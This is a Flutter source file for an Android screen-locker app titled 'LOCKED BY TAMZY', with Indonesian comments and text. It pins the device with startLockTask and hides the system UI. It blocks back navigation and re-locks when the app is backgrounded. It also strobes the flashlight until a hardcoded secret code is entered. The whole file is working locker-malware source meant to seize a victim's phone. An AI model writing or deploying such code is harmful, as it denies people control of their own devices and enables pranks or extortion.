import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flashlight/flashlight.dart'; // ✅ Panggil lampu
import 'dart:async';

void main() {
  runApp(const LockedApp());
}

class LockedApp extends StatelessWidget {
  const LockedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'LOCKED BY TAMZY',
      theme: ThemeData.dark(),
      home: const LockScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class LockScreen extends StatefulWidget {
  const LockScreen({super.key});

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  const String _correctPass = "311986";
  bool _sudahBuka = false;
  Timer? _timerLampu; // ✅ Pengatur waktu kedip

  static const MethodChannel _platform = MethodChannel('com.example.aplikasi_kunci/kunci');

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
    ]);

    if (!_sudahBuka) {
      _aktifkanKunciSistem();
      _mulaiKedipLampu(); // ✅ Nyalakan kedip pas buka
    }
  }

  // ✅ FUNGSI LAMPU KEDIP-KEDIP OTOMATIS
  void _mulaiKedipLampu() {
    _timerLampu = Timer.periodic(const Duration(milliseconds: 300), (timer) async {
      if (_sudahBuka) {
        timer.cancel();
        Flashlight.turnOff(); // Matikan kalau sudah buka
        return;
      }
      bool nyala = timer.tick % 2 == 0;
      if (nyala) {
        Flashlight.turnOn();
      } else {
        Flashlight.turnOff();
      }
    });
  }

  Future<void> _aktifkanKunciSistem() async {
    try {
      await _platform.invokeMethod('startLockTask');
    } catch (_) {}
  }

  Future<void> _matikanKunciTotal() async {
    try {
      await _platform.invokeMethod('stopLockTask');
    } catch (_) {}
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
    
    // ✅ MATIKAN LAMPU & KEDIPAN SELAMANYA
    _timerLampu?.cancel();
    Flashlight.turnOff();

    if (mounted) setState(() => _sudahBuka = true);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (_sudahBuka) return;
    if (state == AppLifecycleState.paused || state == AppLifecycleState.inactive || state == AppLifecycleState.detached) {
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      if (!_sudahBuka) _aktifkanKunciSistem();
    }
  }

  void _cekSandi() {
    if (_passController.text == _correctPass) {
      _matikanKunciTotal();
      SystemNavigator.pop();
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("❌ KODE SALAH! PERANGKAT TETAP TERKUNCI"), backgroundColor: Colors.red)
      );
      _passController.clear();
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _timerLampu?.cancel(); // Pastikan timer mati
    Flashlight.turnOff(); // Pastikan lampu mati
    _passController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: _sudahBuka,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Stack(
          fit: StackFit.expand,
          children: [
            const Positioned.fill(
              child: SingleChildScrollView(
                physics: NeverScrollableScrollPhysics(),
                child: Column(
                  children: [
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FF00), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.greenAccent, blurRadius: 20)])),
                    Text("LOCKED BY TAMZY", style: TextStyle(color: Color(0xA000FFFF), fontSize: 52, fontWeight: FontWeight.bold, shadows: [Shadow(color: Colors.cyanAccent, blurRadius: 20)])),
                  ],
                ),
              ),
            ),
            Center(
              child: Container(
                padding: const EdgeInsets.all(28),
                decoration: BoxDecoration(
                  color: Colors.black.withValues(alpha: 0.85),
                  border: Border.all(color: Colors.greenAccent, width: 3),
                  borderRadius: BorderRadius.circular(15),
                  boxShadow: [BoxShadow(color: Colors.greenAccent.withValues(alpha: 0.6), blurRadius: 25, spreadRadius: 2)],
                ),
                width: 340,
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Text("⚠️ PERANGKAT TERKUNCI ⚠️", style: TextStyle(color: Colors.redAccent, fontSize: 24, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 20),
                    const Text("PERANGKAT INI DIKUNCI.\nMASUKKAN KODE RAHASIA UNTUK MEMBUKA.", style: TextStyle(color: Colors.white70, fontSize: 14), textAlign: TextAlign.center),
                    const SizedBox(height: 20),
                    TextField(
                      controller: _passController,
                      obscureText: true,
                      style: const TextStyle(color: Colors.greenAccent, fontSize: 20, letterSpacing: 5),
                      keyboardType: TextInputType.number,
                      textAlign: TextAlign.center,
                      decoration: InputDecoration(
                        filled: true,
                        fillColor: Colors.grey[900],
                        border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: Colors.greenAccent, width: 2)),
                        hintText: "______",
                        hintStyle: const TextStyle(color: Colors.grey, fontSize: 24),
                      ),
                      onSubmitted: (_) => _cekSandi(),
                    ),
                    const SizedBox(height: 20),
                    ElevatedButton(
                      style: ElevatedButton.styleFrom(backgroundColor: Colors.greenAccent[700], padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)), elevation: 10),
                      onPressed: _cekSandi,
                      child: const Text("BUKA KUNCI", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}